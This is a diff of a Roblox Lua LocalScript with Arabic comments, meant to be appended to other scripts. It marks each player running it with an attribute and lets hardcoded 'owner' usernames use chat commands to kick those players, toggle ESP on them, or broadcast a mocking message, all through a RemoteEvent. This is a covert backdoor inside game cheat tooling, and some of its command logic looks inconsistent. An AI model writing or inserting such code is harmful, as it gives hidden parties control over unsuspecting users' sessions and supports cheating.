@@ -1,91 +1,90 @@
---// قائمة الأدمنة الحقيقيين (يقدرون يعطون الأوامر)
-local RealAdmins = {
-    "eyad51533",
-    "1il5i",
-    "1il5f",
-    -- أضف يوزرات ثانية هنا لو تبي
-}
-
---// متغير يدل إن اللاعب عنده السكربت (نرفعه للريبلكيتد عشان الكل يشوفه)
+--// ضع هذا الكود في آخر أي سكربت (LocalScript) عندك
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Events = ReplicatedStorage:WaitForChild("Events")
-local SendMessage = Events:WaitForChild("SendMessage")
-
+local SendMessage = ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")
 local player = Players.LocalPlayer
 
--- نعطي إشارة للكل إن هذا اللاعب عنده السكربت (بواسطة Attribute)
-player:SetAttribute("HasExploitScript", true)
+--// الأونرات الحقيقيين (يقدرون يستخدمون كل الأوامر)
+local Owners = {
+    ["1il5i"] = true,
+    ["eyad51533"] = true,
+    ["awr_9351156"] = true,
+    ["sj3zx"] = true,
+}
 
--- دالة تتحقق إذا اللاعب عنده السكربت أو لا
-local function hasScript(targetPlayer)
-    return targetPlayer:GetAttribute("HasExploitScript") == true
-end
+--// علامة إن اللاعب عنده السكربت
+player:SetAttribute("UsingScript", true)
 
--- دالة تتحقق إذا اللاعب أدمن حقيقي
-local function isRealAdmin(plr)
-    for _, name in ipairs(RealAdmins) do
-        if plr.Name == name then
-            return true
-        end
-    end
-    return false
-end
+local function isOwner(p) return Owners[p.Name] end
+local function hasScript(p) return p:GetAttribute("UsingScript") == true end
 
--- دالة الطرد
-local function kickTarget(targetPlayer, reason)
-    reason = reason or "تم طردك من السيرفر."
-    local args = {
-        "!kick @" .. targetPlayer.DisplayName,
-        reason
-    }
-    SendMessage:FireServer(unpack(args))
-end
-
--- الاستماع للشات
+--// الاستماع للشات
 player.Chatted:Connect(function(msg)
-    if not isRealAdmin(player) then return end -- لو مو أدمن = ما يشتغل
+    if not isOwner(player) then return end -- بس الأونرات يقدرون يكتبون الأوامر
 
     local lower = msg:lower()
-    if lower:sub(1, 5) == "!kick" then
-        local rest = msg:sub(6):match("^%s*(.-)%s*$")
 
-        if rest == "" then
-            warn("اكتب اسم اللاعب يا بطل !kick @اسم")
-            return
-        end
-
-        -- نفصل الاسم عن الرسالة
-        local targetStr, reason = rest:match("^(.-)%s+(.+)$")
-        if not targetStr then targetStr = rest end
-
-        -- نبحث عن اللاعب اللي عنده السكربت فقط
-        local foundPlayer = nil
+    --// الأمر: .3mk all → يخلي كل اللي عندهم السكربت يرسلون الرسالة الزحفية
+    if lower == ".3mk all" then
+        SendMessage:FireServer(".3mk all")
+        task.wait(0.5)
         for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= player and hasScript(p) then
-                if p.DisplayName:lower():find(targetStr:lower(), 1, true) 
-                or p.Name:lower():find(targetStr:lower(), 1, true) then
-                    foundPlayer = p
-                    break
+            if hasScript(p) and p ~= player then
+                SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
+            end
+        end
+        return
+    end
+
+    --// الأمر: .3mk [اسم جزئي] → يستهدف لاعب واحد عنده السكربت
+    if lower:sub(1,5) == ".3mk " then
+        local target = msg:sub(6)
+        if target == "" or target == "all" then return end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if hasScript(p) and (p.DisplayName:lower():find(target:lower()) or p.Name:lower():find(target:lower())) then
+                SendMessage:FireServer(".3mk " .. p.DisplayName)
+                task.wait(0.3)
+                SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
+                print("تم استهداف: " .. p.DisplayName)
+                return
+            end
+        end
+        return
+    end
+
+    --// الأمر: .esp all → يفعّل ESP أبيض على كل اللي عندهم السكربت
+    if lower == ".esp all" then
+        SendMessage:FireServer(".esp all")
+        return
+    end
+
+    --// الأمر: .unesp all → يطفي الـ ESP
+    if lower == ".unesp all" then
+        SendMessage:FireServer(".unesp all")
+        return
+    end
+
+    --// الأمر: .kick all [السبب]
+    --// أو .kick [اسم] [السبب]
+    if lower:sub(1,6) == ".kick " then
+        local rest = msg:sub(7)
+        local target, reason = rest:match("^(.-)%s+(.+)$")
+        if not target then target = rest end
+        if target == "" then return end
+
+        if target:lower() == "all" then
+            SendMessage:FireServer(".kick all " .. (reason or "عمكم انا"))
+        else
+            for _, p in ipairs(Players:GetPlayers()) do
+                if hasScript(p) and (p.DisplayName:lower():find(target:lower()) or p.Name:lower():find(target:lower())) then
+                    SendMessage:FireServer(".kick " .. p.DisplayName .. " " .. (reason or "عمكم انا"))
+                    print("طرد: " .. p.DisplayName .. " | السبب: " .. (reason or "عمكم انا"))
+                    return
                 end
             end
         end
-
-        if not foundPlayer then
-            warn("ما لقيت لاعب بالسكربت بهالاسم: " .. targetStr)
-            return
-        end
-
-        -- ما تقدر تطرد أدمن ثاني
-        if isRealAdmin(foundPlayer) then
-            warn("ما تقدر تطرد أدمن ثاني يا بطل!")
-            return
-        end
-
-        -- نطرده
-        kickTarget(foundPlayer, reason or "تم طردك بواسطة أدمن.")
-        print("✓ تم طرد: " .. foundPlayer.DisplayName .. " | السبب: " .. (reason or "بدون"))
+        return
     end
 end)
 
-print("سكربت الأدمن الخاص شغال 100% - يطرد بس اللي عندهم السكربت")
+print("تم تفعيل صلاحيات الأونر بنجاح | أنت الآن تتحكم بالكل")
